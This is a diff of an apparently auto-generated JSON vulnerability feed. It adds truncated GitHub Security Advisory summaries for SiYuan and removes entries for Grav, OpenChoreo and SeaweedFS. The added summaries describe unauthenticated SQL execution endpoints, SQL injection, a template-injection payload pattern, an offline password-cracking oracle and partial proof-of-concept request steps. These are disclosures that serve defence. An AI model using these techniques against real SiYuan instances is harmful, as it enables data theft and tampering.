@@ -1,8 +1,8 @@
 {
-  "generated": "2026-09-03T20:13:46.218556+00:00",
-  "total": 44,
+  "generated": "2026-09-04T01:42:08.354065+00:00",
+  "total": 35,
   "kev": 0,
-  "zero_day": 12,
+  "zero_day": 11,
   "enriched": 0,
   "findings": [
     {
@@ -179,11 +179,11 @@
       "is_high_severity": false
     },
     {
-      "id": "CVE-2026-61690",
-      "title": "Grav: Decompression Bomb via ZipArchiver - Missing Extraction Limits",
-      "summary": "## Summary\n`ZipArchiver::extract()` lacks limits on uncompressed size, file count, and nesting depth, creating a distinct, unpatched variant of the GHSA-2vcx-h8p2-9pg9 zip bomb vulnerability. While the parallel method Installer::unZip() received comprehensive limits, ZipArchiver::extract() remains unprotected, leaving a separate code path vulnerable to the same attack vector. The vulnerability is a distinct, unpatched variant of the bug described in GHSA-2vcx-h8p2-9pg9, as it affects a separate code path in the same codebase, implementing the same abstract class.\n\n---\n\n## Details\n\n**Vulnerable code** - `system/src/Grav/Common/Filesystem/ZipArchiver.php:29-58`:\n\n```php\npublic function extract($destination, ?callable $status = null)\n{\n    $zip = new ZipArchive();\n    $archive = $zip->open($this->archive_file);\n\n    if ($archive === true) {\n        Folder::create($destination);\n\n        // Only guards against Zip Slip (path traversal)\n        for ($i = 0, $count = $zip->count(); $i < $count; $i++) {\n            $name = $zip->getNameIndex($i);\n            if ($name !== false && !$this->isSafeEntryPath($name)) {\n                $zip->close();\n                throw new RuntimeException(...);\n            }\n        }\n\n        // Extracts EVERYTHING \u2014 no size, count, or depth limit\n        if (!$zip->extractTo($destination)) { ... }\n\n        $zip->close();\n        return $this;\n    }\n}\n```\n\n**What's missing vs `Installer::unZip()`**:\n\n| Protection | `Installer::unZip()` | `ZipArchiver::extract()` |\n|-----------|---------------------|------------------------|\n| Zip Slip guard | \u2705 | \u2705 |\n| Max uncompressed size | \u2705 (1 GiB) | \u274c |\n| Max file count | \u2705 (50000) | \u274c |\n| Max nesting depth | \u2705 (48) | \u274c |\n| Pre-extraction validation | \u2705 All entries validated first | \u274c Extracts immediately |\n\n**The fix applied to Installer** (GHSA-2vcx, `Installer.php:178-269`):\n\n```php\n// GHSA-2vcx-h8p2-9pg9: bound what extractTo() will write to disk.\n$limits = $this->archiveLimits();\n$size = $count = ",
-      "link": "https://github.com/advisories/GHSA-928x-9mpw-8h56",
-      "published": "2026-09-02T21:35:43Z",
+      "id": "CVE-2026-72801",
+      "title": "SiYuan: Encrypted-notebook key-derivation material and wrapped notebook keys disclosed to anonymous readers, enabling offline master-password cracking",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72801](https://nvd.nist.gov/vuln/detail/CVE-2026-72801).\n\n### Summary\n\nTwo `CheckAuth`-only endpoints disclose the complete offline attack material for the encrypted-notebook master password, plus the wrapped per-notebook key needed to use it. Both are reachable by the publish `RoleReader` token and by the anonymous account when `Publish.Auth.Enable` is `false`. An unauthenticated remote client can retrieve the Argon2id salt and cost parameters, a verifier that confirms a correct password offline, and the encrypted per-notebook data key reducing the security of every encrypted notebook to the master password's resistance to offline GPU cracking.\n\n### Details\n\n**(1) `POST /api/system/getConf` leaks `NotebookCrypto`.**\n\n`getConf` \u2192 `GetMaskedConf()` marshals the full configuration including `NotebookCrypto *conf.NotebookCrypto` (JSON tag `notebookCrypto`, not `-`, so it survives the deep copy). For non-administrators `HideConfSecret()` is applied, which nulls a dozen secret-bearing fields like AI, MCPOAuth, Api, Flashcard, Publish, Repo, Sync, Secrets, Variables, System paths but contains **no reference to `NotebookCrypto`**. `FilterConfByPublishIgnore()` for readers only touches `UILayout`.\n\nThe reader therefore receives:\n\n| Field | What it is |\n|---|---|\n| `MasterSalt` | global Argon2id salt |\n| `KDFParams` | Argon2id memory/time/parallelism cost |\n| `KEKVerifier` + `VerifierNonce` | AES-GCM-encrypted fixed magic, the in-code comment states it exists for offline master-password verification |\n| `KEKMAC` | HMAC-SHA256 of the KEK |\n\nEither `KEKVerifier` or `KEKMAC` is a self-contained offline oracle:\n\n```\nKEK = Argon2id(guess, MasterSalt, KDFParams)\ncorrect if AES-GCM-decrypt(KEKVerifier, VerifierNonce) == magic\n        or HMAC(KEK) == KEKMAC\n```\n\nNo server round-trips are required, so there is no rate limiting, lockout, or logging on guesses, and the work is fully GPU-parallelisable.\n\n**(2) `POST /api/notebook/getN",
+      "link": "https://github.com/advisories/GHSA-8x84-r2ff-h8pq",
+      "published": "2026-09-03T23:02:12Z",
       "source": "GitHub Security Advisories",
       "tags": [
         "github",
@@ -191,10 +191,136 @@
         "oss"
       ],
       "cve_ids": [
-        "CVE-2026-61690"
+        "CVE-2026-72801"
       ],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72803",
+      "title": "SiYuan: Missing publish-access filter on getBlockAttrs and batchGetBlockAttrs discloses block attributes (name, alias, memo, custom fields) of protected documents",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72803](https://nvd.nist.gov/vuln/detail/CVE-2026-72803).\n\n### Summary\n\n`POST /api/attr/getBlockAttrs` and `POST /api/attr/batchGetBlockAttrs` return a block's full attribute set (IAL) with no publish-access check. Both are `CheckAuth`-only, so they are reachable by the publish `RoleReader` token and by the anonymous account when `Publish.Auth.Enable` is `false`. An anonymous reader supplying a block ID receives the block's name, alias, memo, bookmark, tags, and every `custom-*` attribute including for blocks in publish-forbidden and password-protected documents. The batch variant accepts an ID list, making it a bulk extraction primitive.\n\n### Details\n\nNeither handler applies a filter:\n\n```go\n// /api/attr/getBlockAttrs      (router line 301)\nret.Data = sql.GetBlockAttrs(id)\n\n// /api/attr/batchGetBlockAttrs (router line 302)\nret.Data = sql.BatchGetBlockAttrs(idList)\n```\n\n`sql.GetBlockAttrs` is a direct database read returning the block's entire IAL: `name`, `alias`, `memo`, `bookmark`, `tags`, and any `custom-*` key/value the user has set. Several of these are user-authored free text memos in particular are freeform notes attached to a block so this is document content, not merely structural metadata.\n\n`batchGetBlockAttrs` takes an arbitrary list of block IDs in a single request, so an attacker holding a set of block IDs can sweep attributes across the entire workspace in one call.\n\n**Guarded-sibling asymmetry.** The sibling metadata endpoint `getBlockInfo` calls `checkBlockPublishAccess(c, id, ret)` before returning; `getBlockAttrs` and `batchGetBlockAttrs` call nothing.\n\nVerified at `origin/master`: both handler bodies contain no publish-access, publish-ignore, or readonly-role check, and both routes are registered `CheckAuth` without `CheckAdminRole`.\n\n### Proof of Concept\n\nPrecondition: publish mode enabled (default port 6808); anonymous when `Publish.Auth.Enable` is `false`, otherwise any publish reader account",
+      "link": "https://github.com/advisories/GHSA-qvq9-hq6p-v378",
+      "published": "2026-09-03T22:58:29Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72803"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72806",
+      "title": "SiYuan: Password (protected) tier omitted in the attribute-view/database publish filter: Reader receives rows of protected documents without the password (publish mode)",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72806](https://nvd.nist.gov/vuln/detail/CVE-2026-72806).\n\n### Summary\n\n`FilterViewByPublishAccess`, the filter `renderAttributeView` applies for Reader sessions drops rows using only the hidden/forbidden check and never checks the publish password. Its three sibling filters all check both tiers. As a result, a publish `RoleReader` (or the anonymous account when `Publish.Auth.Enable` is `false`) who has not entered a document's password still receives every database/attribute-view row bound to that password-protected document, the primary cell (title/ID) and all column values.\n\n### Details\n\n`FilterViewByPublishAccess` (`model/publish_access.go:290`) drops rows on the hidden/forbidden tier only:\n```go\n// Table (line 311), Gallery (348), Kanban (385), all identical:\nif !CheckPathAccessableByPublishIgnore(bt.BoxID, bt.Path, publishIgnore) {\n    row = nil   // hidden/forbidden dropped, but password NEVER checked\n}\n```\n\nThe three sibling filters all check both the hidden/forbidden tier and the password tier (`password == \"\" || CheckPublishAuthCookie(...)`):\n- `FilterBlockAttributeViewKeysByPublishAccess` (line 412)\n- `FilterBlockInfoByPublishAccess` (line 457)\n- `FilterContentByPublishAccess` (line 474)\n\nSo the password (protected) tier is enforced everywhere except this AV/database-view filter. Table layout masks nothing; Gallery and Kanban mask only the cover, keeping the card and its non-cover values. Reachable via `renderAttributeView`, `getAttributeViewKeys`, and `renderSnapshotAttributeView`, all `CheckAuth`-only.\n\n### Proof of Concept\n\nReproduced on a live instance (publish mode on 6808, anonymous Reader, no password cookie), against a password-protected document with a database/AV row.\n\n| Check | Path | Result |\n|---|---|---|\n| Control | `getDoc(secretDoc)` | \ud83d\udd12 placeholder, body withheld password gate works normally |\n| Test | `renderAttributeView(AV)` | row leaked : `blockID=\u2026rk7jofz`, title `secret-db-row` |\n|",
+      "link": "https://github.com/advisories/GHSA-6mcf-g667-w3qv",
+      "published": "2026-09-03T22:50:49Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72806"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72807",
+      "title": "SiYuan: Second-order SSTI to arbitrary SQL via attribute-view template column (queryBlocks): malicious imported package executes SQL on victim kernel",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72807](https://nvd.nist.gov/vuln/detail/CVE-2026-72807).\n\n### Summary\n\nAttribute-view (AV) template columns are live-evaluated on every render and expose the `queryBlocks` template function, which runs raw SQL on the read-write database handle (`SelectBlocksRawStmt`, using `?`\u2192argument string substitution rather than parameter binding). AV mutations are admin-gated, so this is not directly reader-injectable but it is a second-order vector: an attacker distributes a SiYuan document or AV package whose template column contains `.action{queryBlocks \"<arbitrary SQL>\"}` when a victim imports the package and renders the AV, the attacker's SQL executes on the victim's kernel (read and, via statement stacking, write).\n\n### Details\n\nDoc-level `{{\u2026}}` templates are rendered at insert-time and become static, so they are not re-evaluated on reader view. The residual is AV template columns, which are live-evaluated at render. `queryBlocks` passes its argument to `SelectBlocksRawStmt` with `?`\u2192arg string substitution, not a bound parameter, on the main read-write handle (`88250/go-sqlite3` fork, statement-stacking capable) so an attacker-controlled template argument becomes arbitrary SQL.\n\nThe SSTI surface is otherwise hardened: `BuiltInTemplateFuncs` deletes `env`, `expandenv`, and `getHostByName` so there is no environment/host/file/exec SSTI. `queryBlocks`-to-SQL is the remaining live-evaluated sink.\n\n### Proof of Concept\n\nAn AV template column set to `.action{queryBlocks \"<sql>\"}` executes `<sql>` against the read-write handle when the AV is rendered. Delivered second-order: a shared/imported document or AV package carrying such a column runs the embedded SQL on any kernel that imports and renders it.\n\n### Proof of Concept\n\nReproduced on a live instance.\n\n**1. Host doc + AV (admin, 6806):**\n```\nPOST /api/filetree/createDocWithMd {notebook, path:\"/ssti-poc\", markdown:\"host\"}  \u2192 DOC\nPOST /api/av/renderAttributeView   {id:\"<AV",
+      "link": "https://github.com/advisories/GHSA-x67c-8pwr-m8g3",
+      "published": "2026-09-03T22:49:30Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72807"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72808",
+      "title": "SiYuan: Missing publish-access filter on getFileAnnotation discloses private PDF annotations of forbidden/protected documents (publish mode)",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72808](https://nvd.nist.gov/vuln/detail/CVE-2026-72808).\n\n### Summary\n\nThe `/api/asset/getFileAnnotation` endpoint returns the content of `.sya` PDF-annotation files with no publish-access check. It is gated by `CheckAuth` only, so it is reachable by the publish `RoleReader` token and by the anonymous account when `Publish.Auth.Enable` is `false`. Its sibling, the `/assets/*` asset route does enforce publish access, including the publish password. An anonymous reader who knows an asset path can therefore read the private PDF annotations (highlights, notes) attached to assets in publish-forbidden, password-protected, or unpublished documents.\n\n### Details\n\n`getFileAnnotation` resolves the annotation file via `GetAssetAbsPathInBox` (no path traversal) and returns the `.sya` content. Unlike the `/assets/*` route, which applies the publish-access filter including password enforcement before serving asset bytes, `getFileAnnotation` applies no publish-access, publish-ignore, or password check. The guarded-sibling asymmetry indicates the boundary is meant to apply to this data and was omitted here.\n\n`.sya` files for encrypted-box assets are fail-closed and not exposed. The gap is limited to non-encrypted assets.\n\n**Route / auth tier.** `getFileAnnotation` is registered `CheckAuth`-only. `CheckAuth` admits `RoleReader`; the publish proxy forwards port-6808 traffic with a Reader JWT (anonymous when publish auth is disabled).\n\n### Proof of Concept\n\nReproduced on a local instance (publish mode on 6808, Basic Auth off).\n\n**Setup (admin, 6806):**\n1. `createNotebook{name:\"AnnotPoc\"}` \u2192 box\n2. `createDocWithMd{notebook, path:\"/annot-victim\", markdown:\"doc with a pdf\"}` \u2192 doc\n3. `POST /api/asset/upload` (multipart `id=<doc>`, `file[]=@secret.pdf`) \u2192 `assets/secret-...pdf`\n4. `setFileAnnotation{path:\"<asset>.sya\", data:\"{annotSecret:ANNOT_SECRET_4471,note:private highlight}\"}`\n5. `setPublishAccess{id:<doc>, visible:false, password",
+      "link": "https://github.com/advisories/GHSA-v7ph-r5r6-4jcj",
+      "published": "2026-09-03T22:48:22Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72808"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-72811",
+      "title": "SiYuan: SQL injection in backlink/mention search via unescaped stored and client input (publish mode): first-order (client keyword) and second-order (stored document title) breakout on read-write handle",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-72811](https://nvd.nist.gov/vuln/detail/CVE-2026-72811).\n\n### Summary\n\nThe backlink/mention search query (`kernel/model/backlink.go`) concatenates stored block metadata (title, name, alias, anchor text) and the client-supplied keyword into a SQL `MATCH`/search statement, escaping only the double-quote character (`\"`) and not the single quote (`'`). A single quote in either the client keyword or in stored document metadata breaks out of the string literal. The query runs on the main read-write `siyuan.db` handle through a statement-stacking-capable driver.\n\nThis yields two vectors:\n- **First-order:** a client-supplied keyword containing `'` injects directly. This path is reachable by an anonymous reader on the publish surface.\n- **Second-order:** a document whose title/name/alias contains `'` is stored safely (indexing uses parameterized inserts) but detonates when that stored value is later concatenated into the backlink query including on another user's kernel that has ingested the malicious document.\n\n### Details\n\n**Storage is safe; reuse is not.** Indexing INSERTs (`kernel/sql/upsert.go`) are parameterized (`(?,?,\u2026)` with bound arguments for `Name`/`Content`/`Markdown`/`IAL`), so malicious `.sy` content is stored intact and safely. The injection is in the *reuse* path: the backlink/mention MATCH query (`kernel/model/backlink.go`, around line 980) builds its condition by concatenating the stored title/name/alias/anchor and the client keyword, applying only `\"`\u2192escaping and not `'`. A `'` in either source terminates the literal and lands in SQL context.\n\n**Sink / handle.** The concatenated statement reaches `SelectBlocksRawStmtNoParse` \u2192 `query()` on the global read-write `siyuan.db` handle (DSN has no `mode=ro`/`_query_only`), driven by the vendored `88250/go-sqlite3` fork whose connection `query` loops over `;`-separated statements (stacking possible). Ceiling is arbitrary SQL cross-notebook read and write.\n\n**",
+      "link": "https://github.com/advisories/GHSA-q2vg-7qgx-x5fc",
+      "published": "2026-09-03T22:27:50Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-72811"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69083",
+      "title": "SiYuan: Unauthenticated SQL execution and REGEXP injection via fullTextSearchAssetContent (publish mode): reader-reachable raw SQL (method 2) and unescaped REGEXP (method 3) on read-write asset-content DB",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-69083](https://nvd.nist.gov/vuln/detail/CVE-2026-69083).\n\n### Summary\n\nThe `/api/search/fullTextSearchAssetContent` endpoint exposes two SQL flaws on the asset-content database, both reachable by the publish `RoleReader` token and by the anonymous account when `Publish.Auth.Enable` is `false`:\n\n1. **method 2** passes a client-supplied SQL statement to the read-write asset-content DB with no single-statement or read-only guard, and without the admin restriction its sibling `fullTextSearchBlock` applies to the same SQL method.\n2. **method 3** builds a `REGEXP` clause by concatenating the client expression with no quote-escaping, permitting SQL breakout while the equivalent block-search builder does escape.\n\nBoth run on a read-write handle through a statement-stacking-capable driver, spanning the cross-notebook asset-content store.\n\n### Details\n\n**Route / auth tier.** `router.go`: `Handle(\"POST\", \"/api/search/fullTextSearchAssetContent\", model.CheckAuth, fullTextSearchAssetContent)`, `CheckAuth` only. Anonymous/reader reachable on the publish surface. `parseSearchAssetContentArgs` reads `method` and `query` straight from the JSON body with no constraint, so both are fully client-controlled.\n\n**Missing admin guard (contrast with the sibling).** `fullTextSearchBlock` rejects the SQL method for non-admins (`if method == 2 && !IsAdminRoleContext(c)`). `fullTextSearchAssetContent` has no such check on its handler, so the SQL method is reachable by a reader.\n\n**method 2 : raw SQL, no statement guard.** Dispatch: `FullTextSearchAssetContent` case 2 \u2192 `searchAssetContentBySQL(query, \u2026)`. After `filterQueryInvisibleChars` + `TrimSpace`, the statement is passed to `sql.SelectAssetContentsRawStmt(stmt, \u2026)` \u2192 `queryAssetContent` \u2192 `assetContentDB.Query(query)` directly, with no `CheckSingleStatement`/`CheckReadonlyStatement`. The `assetContentDB` DSN sets no `mode=ro`/`_query_only`, so the handle is read-write (same `88250/go-sq",
+      "link": "https://github.com/advisories/GHSA-fph3-ghq9-vw66",
+      "published": "2026-09-03T21:01:05Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69083"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-69084",
+      "title": "SiYuan: Unauthenticated arbitrary SQL execution via searchEmbedBlock (publish mode) : reader-reachable raw statement on read-write handle, cross-notebook read/write",
+      "summary": "**CVE:** This vulnerability corresponds to [CVE-2026-69084](https://nvd.nist.gov/vuln/detail/CVE-2026-69084).\n\n### Summary\n\nThe `/api/search/searchEmbedBlock` endpoint passes a client-supplied SQL statement verbatim to the database with no validation. The endpoint is gated by `CheckAuth` only reachable by the publish RoleReader token, and by the anonymous account when `Publish.Auth.Enable` is `false`. The statement runs on the main read-write `siyuan.db` handle through a driver that executes stacked statements, with no single-statement or read-only guard. An unauthenticated request can therefore execute arbitrary SQL reading and writing content across all cleartext notebooks.\n\nUnlike SQL injection into a fixed query, this endpoint accepts a full SQL statement by design and simply fails to restrict who may call it or what the statement may do.\n\n### Details\n\nData flow verbatim, unvalidated:\n\n- `searchEmbedBlock` (`kernel/api/search.go`): `stmt := arg[\"stmt\"].(string)` passed directly to `model.SearchEmbedBlock(stmt, \u2026)`. No validation.\n- `SearchEmbedBlock` \u2192 `SearchEmbedBlockInBox` \u2192 `sql.SelectBlocksRawStmtNoParse(stmt, \u2026)` \u2192 `selectBlocksRawStmt` \u2192 `query(stmt)`.\n- `query()` (`kernel/sql/database.go`) calls `db.Query(stmt)` on the global `siyuan.db` handle.\n\n**Missing guards.** The comparable endpoints enforce restrictions this one omits:\n- `/api/query/sql` runs `CheckSingleStatement` (all modes) and `CheckReadonlyStatement` (readonly mode) and is route-gated `CheckAuth + CheckAdminRole + CheckReadonly`.\n- `fullTextSearchBlock` rejects the SQL search method for non-admins (`if method == 2 && !IsAdminRoleContext(c)`).\n\n`searchEmbedBlock` has none of these, no statement check, no read-only check, no admin gate.\n\n**Route/auth tier.** `router.go`: `Handle(\"POST\", \"/api/search/searchEmbedBlock\", model.CheckAuth, searchEmbedBlock)`, `CheckAuth` only. `CheckAuth` admits `RoleReader`, and the publish proxy forwards port-6808 traffic with a Reader JWT (anonymous account when",
+      "link": "https://github.com/advisories/GHSA-vh22-h7hf-www7",
+      "published": "2026-09-03T20:19:22Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-69084"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "CVE-2026-63670",
@@ -458,293 +584,6 @@
       ],
       "cve_ids": [
         "CVE-2026-83548"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73667",
-      "title": "OpenChoreo: Authenticated OS command injection via OpenChoreo Workflow Plane templates enables code execution in privileged pods",
-      "summary": "### Summary\nOpenChoreo Workflow Plane templates were vulnerable to OS command injection because some developer-controlled workflow parameters were interpolated directly into shell program text executed through sh -c.\n\nAn authenticated user with permission to configure and trigger an affected workflow could supply crafted parameter values containing shell metacharacters. Because Argo substituted these values directly into the shell script before execution, the values could alter the script and execute arbitrary commands inside the workflow pod.\n\nIn affected configurations, some build and publish templates used privileged Podman containers without Kubernetes pod user-namespace isolation. Consequently, injected commands could run as UID 0 inside a privileged container, with UID 0 mapped into the host user namespace. This substantially increased the potential impact of the command-injection vulnerability.\n\nThe remediation ensures that workflow parameters are treated as data rather than executable shell syntax. Affected values are now passed through container.env and consumed as quoted shell variables. JSON-derived build environment variables and build arguments are passed as separate argument-vector entries instead of being reconstructed as whitespace-delimited shell strings.\n\n### Impact\nAn authenticated user with permission to trigger an affected workflow could execute arbitrary commands inside the corresponding workflow pod.\n\nDepending on the affected template and its configuration, an attacker could potentially:\n- Read source code checked out by the workflow.\n- Read Git credentials, registry credentials, or other secrets mounted into the pod.\n- Read the pod's Kubernetes service account token.\n- Access mounted volumes and other build-time data.\n- etc\n\nSome affected build and publish templates ran Podman using:\n\n```\nsecurityContext:\n  privileged: true\n```\n\nand did not previously enable pod user namespaces.\n\nWithout `hostUsers: false`, UID 0 inside the container is UID ",
-      "link": "https://github.com/advisories/GHSA-2mw5-23gm-pccq",
-      "published": "2026-09-02T23:45:26Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-73667"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73840",
-      "title": "OpenChoreo: Unauthenticated build/workflow trigger via git-provider confusion (webhook signature bypass)",
-      "summary": "## Summary\nThe OpenChoreo autobuild webhook endpoint (`POST /api/v1alpha1/autobuild`) selected the git provider used to authenticate an incoming webhook from a client-supplied request header rather than from the target component's configuration, and its Bitbucket provider accepted requests without a valid signature. A caller could set the `X-Event-Key` header to be treated as a Bitbucket webhook, bypassing the HMAC secret that otherwise protects GitHub and GitLab webhooks, and trigger a component build without authenticating.\n\n## Impact\nAn attacker who can reach the autobuild webhook endpoint and knows the repository URL and branch configured for an auto-build component can trigger a build for that component without authenticating \u2014 including components configured for GitHub or GitLab, since the provider used or verification is chosen by the caller rather than by the component's configuration. The\ntriggered build runs against a commit SHA supplied by the attacker, and the component lookup is not scoped to a tenant or namespace, so any auto-build component across the cluster matching the given repository and branch is affected. This can result in unauthorized builds \u2014 and, where auto-deploy is configured, unauthorized deployment of attacker-influenced code \u2014 and can be used to exhaust build resources through repeated unauthenticated triggering.\n\nThe exposure applies to any component with `spec.autoBuild: true`, regardless of which git provider it declares, wherever the autobuild webhook endpoint is network-reachable.\n\n## Patches\nFixed in 1.0.3, 1.1.3, and 1.2.0-rc.2. The fix validates Bitbucket webhooks with HMAC-SHA256 against the configured secret using the same verification path as GitHub, requires a configured, non-empty secret for every provider (a missing secret now rejects the request instead of skipping validation), and requires the authenticated provider to match the git provider configured for the\nmatched component. Upgrading is non-disruptive \u2014 no componen",
-      "link": "https://github.com/advisories/GHSA-c5f6-2rm9-2w8g",
-      "published": "2026-09-02T23:45:14Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-73840"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73841",
-      "title": "OpenChoreo: Cross-project command execution and wirelog view access via OpenChoreo openchoreo-api exec and wirelogs endpoints",
-      "summary": "### Summary\n\nThe OpenChoreo API server (`openchoreo-api`) authorized requests to its exec and wirelogs endpoints against the project supplied by the caller in the request, rather than against the project that actually owns the target component. The target component was resolved by name only, and the authorization engine decided purely from the caller-supplied resource hierarchy \u2014 the component's real owning project was never checked. As a result, an authenticated user who holds a project-scoped exec or log-viewing grant on any single project could run commands in, and read the wirelogs of, components owned by other projects in the same namespace.\n\n### Impact\n\nAn authenticated tenant holding a project-scoped `component:exec` grant on just one project can execute arbitrary commands \u2014 including an interactive shell \u2014 inside the running pods of components owned by any other project in the same namespace. This exposes those workloads' environment variables and mounted Secrets (such as database credentials, API keys, and tokens), allows tampering with the workload, and enables further pivoting using the workload's own network position and credentials. The same flaw in the wirelogs endpoint lets a project-scoped `wirelogs:view` grant read any component's wirelogs in the namespace.\n\nThe blast radius is every component in the namespace, reachable from a single legitimate project grant. The boundary crossed is project-within-namespace: the request still pins the namespace, so the issue does not cross namespace boundaries. In effect this is a cross-project (cross-team) remote command-execution and data-access primitive available to any low-privileged tenant.\n\n### Patches\n\nFixed in **1.2.3** and **1.1.6**. The fix aligns the exec and wirelogs endpoints with the pattern already used by other first-class component operations: the target component is fetched first and authorization is evaluated against its real owning project (`comp.Spec.Owner.ProjectName`) instead of the caller-s",
-      "link": "https://github.com/advisories/GHSA-52gf-6rpq-fgmx",
-      "published": "2026-09-02T23:44:51Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-73841"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-73843",
-      "title": "OpenChoreo: Unauthenticated access to data-plane operations via OpenChoreo cluster-gateway management APIs",
-      "summary": "### Summary\nThe OpenChoreo control-plane **cluster-gateway** served its caller-facing management APIs on the same network listener that accepts data-plane agent connections. In the multi-cluster topology that listener is published outside the cluster, and the management APIs did not authenticate the calling client. A party able to reach the listener could therefore invoke privileged data-plane operations without authenticating and without passing through the OpenChoreo API server's authorization.\n\n### Impact\nAn attacker who can reach the externally published cluster-gateway endpoint can perform data-plane operations normally restricted to the OpenChoreo API server and gated by its authorization \u2014 including proxying the data plane's Kubernetes API and executing commands inside workload pods. This can result in full compromise of workloads on the affected data plane (disclosure, tampering, and denial of service).\n\nThe exposure applies to the multi-cluster / remote data-plane topology, where the cluster-gateway is published outside the cluster so remote data-plane agents can connect. That same externally reachable listener also served the caller-facing management APIs, which did not authenticate the caller. Deployments that do not publish the cluster-gateway outside the cluster are not affected.\n\n### Patches\nFixed in **1.0.2**, **1.1.2**, and **1.2.0**. The fix moves the caller-facing management APIs onto a separate internal listener that is not published outside the cluster, leaving only the agent-connection endpoint on the externally reachable listener. Upgrading is non-disruptive \u2014 no data-plane agent or configuration changes are required beyond the standard chart upgrade. Upgrade path: 1.1.x \u2192 1.1.2, 1.0.x and earlier \u2192 1.0.2, 1.2 line \u2192 1.2.0.\n\n### Workarounds\nIf you cannot upgrade immediately:\n- If you do run remote data planes, restrict reachability of the external gateway endpoint to known data-plane source addresses only (firewall / gateway-level allowlisting)",
-      "link": "https://github.com/advisories/GHSA-qh9r-j7rp-4x2m",
-      "published": "2026-09-02T23:43:55Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-73843"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-72921",
-      "title": "SeaweedFS: Filer JWT allowed_prefixes literal prefix match allows cross-tenant access to sibling paths",
-      "summary": "### Impact\nWhen a filer JWT restricts a token to a set of path prefixes via `allowed_prefixes`, the authorization check used a literal byte-prefix match (`strings.HasPrefix`). A token scoped to `/tenant1` therefore also authorized requests to sibling paths such as `/tenant1234`, `/tenant1-old`, and `/tenant1backup`.\n\nIn a multi-tenant deployment this lets the holder of one tenant's token access another tenant's data. Because `allowed_prefixes` gates both read and write tokens, the impact covers cross-tenant reads and writes. A valid scoped token is required, so this is an authorization bypass rather than a fully unauthenticated flaw.\n\n### Affected component\n- `weed/server/filer_server_handlers.go` (JWT `allowed_prefixes` authorization check)\n\n### Patches\nFixed in **4.24**. The check now matches on `/`-separated path components after `path.Clean` normalisation, so `/tenant1` authorizes only `/tenant1` and its descendants \u2014 not `/tenant1234` or other sibling paths.\n\n### Workarounds\nWhere feasible, choose prefix names that are not string-prefixes of one another (e.g. keep a trailing separator convention). Upgrade to 4.24.\n\n### References\n- Reported by Kadir Arslan (https://github.com/KadirArslan)",
-      "link": "https://github.com/advisories/GHSA-gv5w-hfx8-8cwq",
-      "published": "2026-09-02T23:42:05Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-72921"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-84366",
-      "title": "Scrapy: S3DownloadHandler sends signed S3 requests over plaintext HTTP by default",
